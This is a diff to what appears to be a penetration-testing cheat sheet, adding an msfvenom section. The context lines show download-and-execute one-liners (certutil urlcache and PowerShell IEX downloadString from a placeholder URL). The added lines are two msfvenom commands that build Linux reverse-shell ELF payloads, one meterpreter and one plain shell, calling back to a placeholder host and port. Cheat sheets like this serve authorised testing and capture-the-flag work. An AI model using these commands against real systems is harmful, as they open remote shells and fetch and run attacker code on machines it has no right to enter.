@@ -185,7 +185,18 @@ certutil.exe -f -urlcache -split <url>
 powershell IEX(New-Object Net.WebClient).downloadString('<url>')"
 ```
 
-----
+-----------
+
+## msfvenom
+
+Linux
+
+```
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
+```
+
+-----------
 
 ## Diccionarios
 
